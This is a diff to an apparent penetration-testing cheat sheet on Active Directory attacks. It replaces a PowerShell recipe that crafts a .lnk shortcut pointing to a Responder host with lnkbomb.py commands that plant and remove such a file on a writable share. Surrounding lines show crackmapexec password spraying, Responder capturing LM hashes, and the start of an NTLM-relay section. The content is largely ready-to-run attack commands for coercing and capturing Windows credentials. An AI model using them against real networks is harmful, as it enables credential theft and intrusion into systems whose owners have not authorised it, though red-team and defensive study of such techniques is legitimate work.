@@ -218,21 +218,19 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   ```bash
   responder -I eth0 --lm
   ```
+<details>
+  <summary> lnkbomb </summary> 
+  ### Create a lnk file for a share with read/write rights
 
-  ### Responder LNK ifle
-
-  #### In Powershell, use each command to create a linkfile for Responder
-  ```powershell
-  $objShell = New-Object -ComObject WScript.Shell
-  $lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
-  $lnk.TargetPath = "\\<ResponderIP>\@threat.png"
-  $lnk.WindowStyle = 1
-  $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
-  $lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
-  $lnk.HotKey = "Ctrl+Alt+O"
-  $lnk.Save()
+  ```bash
+  python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
   ```
-
+  ### Remove the lnk file
+  ```basb
+  python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r dicnwdsebl.url
+  ```
+<details>
+  
   ### Crackmapexec NTLM-relay
   #### Evaluate no smb-signing and create an IP txt file for TLMRelayx
   ```bash
